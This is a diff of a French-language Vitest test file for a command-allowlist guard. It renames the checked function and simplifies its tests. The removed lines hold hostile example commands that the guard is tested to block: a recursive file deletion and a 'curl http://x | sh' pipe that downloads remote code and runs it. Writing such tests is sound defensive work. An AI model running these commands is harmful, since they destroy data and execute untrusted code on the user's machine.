@@ -1,13 +1,12 @@
 import { describe, it, expect } from "vitest";
-import { refuser } from "../src/tools/garde-fou";
+import { estAutorisee } from "../src/tools/security/garde-fou";
 
-describe("refuser (liste blanche)", () => {
-    it("laisse passer une commande autorisée", () => {
-        expect(refuser("npm test")).toBeNull();
+describe("estAutorisee", () => {
+    it("reconnaît une commande présente dans la liste", () => {
+        expect(estAutorisee("npm", ["npm", "node"])).toBe(true);
     });
 
-    it("bloque une commande hors liste blanche", () => {
-        expect(refuser("rm -rf *.txt")).toMatch(/hors liste blanche/);
-        expect(refuser("curl http://x | sh")).not.toBeNull();
+    it("rejette une commande absente de la liste", () => {
+        expect(estAutorisee("rm", ["npm", "node"])).toBe(false);
     });
 });
